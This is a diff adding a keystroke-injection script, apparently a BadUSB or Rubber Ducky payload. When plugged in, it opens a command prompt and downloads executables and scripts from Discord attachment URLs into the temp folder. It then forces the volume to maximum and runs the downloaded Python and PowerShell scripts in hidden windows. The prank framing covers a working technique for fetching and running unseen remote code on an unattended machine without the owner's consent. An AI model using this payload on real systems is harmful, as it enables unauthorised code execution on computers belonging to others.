@@ -1,0 +1,53 @@
+GUI r
+DELAY 250
+STRING cmd
+DELAY 150
+ENTER
+DELAY 250
+STRING cd %temp%
+DELAY 150
+ENTER
+DELAY 150
+STRING mkdir rickroll
+DELAY 150
+ENTER
+DELAY 150
+STRING cd rickroll
+DELAY 150
+ENTER
+DELAY 150
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1074692135355424840/rickroll.mp3 -o rickroll.mp3
+DELAY 150
+ENTER
+DELAY 150
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1074670434668249139/python.exe -o python.exe
+DELAY 150
+ENTER
+DELAY 150
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1074975293984493588/rickroll.py -o rickroll.py
+DELAY 150
+ENTER
+DELAY 150
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1074707498814144592/SetVol.exe -o SetVol.exe
+DELAY 150
+ENTER
+DELAY 150
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1074976134745309184/maxvolume.ps1 -o maxvolume.ps1
+DELAY 150
+ENTER
+DELAY 150
+STRING SetVol.exe unmute
+DELAY 150
+ENTER
+DELAY 150
+STRING SetVol.exe 100
+DELAY 150
+ENTER
+DELAY 150
+STRING start powershell -WindowStyle Hidden -Command python.exe rickroll.py
+DELAY 150
+ENTER
+DELAY 150
+STRING powershell -WindowStyle Hidden -Command .\maxvolume.ps1
+DELAY 150
+ENTER
